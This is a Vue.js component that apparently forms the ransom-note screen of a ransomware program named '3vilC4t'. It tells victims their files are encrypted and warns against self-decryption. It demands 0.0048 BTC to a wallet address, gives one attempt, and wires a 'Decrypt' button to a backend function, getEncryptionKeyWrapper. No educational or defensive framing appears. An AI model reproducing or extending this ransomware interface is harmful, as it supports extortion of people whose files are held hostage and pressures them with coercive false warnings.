<template>
  <div class="container">
    <div :title="message">{{message}}</div>
    <img alt="3vilC4t" src="../assets/images/logo.png" class="logo zoomIn">
    <p :title="message2">{{message2}}</p>
    <p :title="address">{{address}}</p>
    <input type="text" id="decKey" name="decKey" v-model="decKey" placeholder="Decryption Key">
    <a @click="getKeyID">Decrypt</a>
    <p>KeyID: {{keyID}}</p>
  </div>
</template>

<script>
export default {
  data() {
    return {
      message: "You have been infected by 3vilC4t virus. Your files have been encrypted. Do not attempt to decrypt it on your own. It will cause irreversible damage.\n",
      message2: "Pay the ransom to receive the decryption key. You have 1 attempt.",
      address: "0.0048 BTC to mjD6LE6rK9cGSrWmuTK5haFULEUUyceakf ",
      decKey: "",
      keyID: "",
      userprofile: "",
      test: ""
    };
  },
  methods: {
    getKeyID: function() {
      var self = this;
      window.backend.getEncryptionKeyWrapper().then(result => {
        self.keyID = result
      })
    }
  }
};
</script>

<!-- Add "scoped" attribute to limit CSS to this component only -->
<style scoped>
h1 {
  margin-top: 2em;
  position: relative;
  min-height: 5rem;
  width: 100%;
}
a:hover {
  font-size: 1.4em;
  border-color: #77079d;
  background-color: #77079d;
  color: white;
  border: 3px solid white;
  border-radius: 10px;
  padding: 9px;
  cursor: pointer;
  transition: 500ms;
}
a {
  font-size: 1.1em;
  border-color: #77079d;
  background-color: #121212;
  color: #77079d;
  border: 3px solid #77079d;
  border-radius: 10px;
  padding: 9px;
  cursor: pointer;
}
</style>
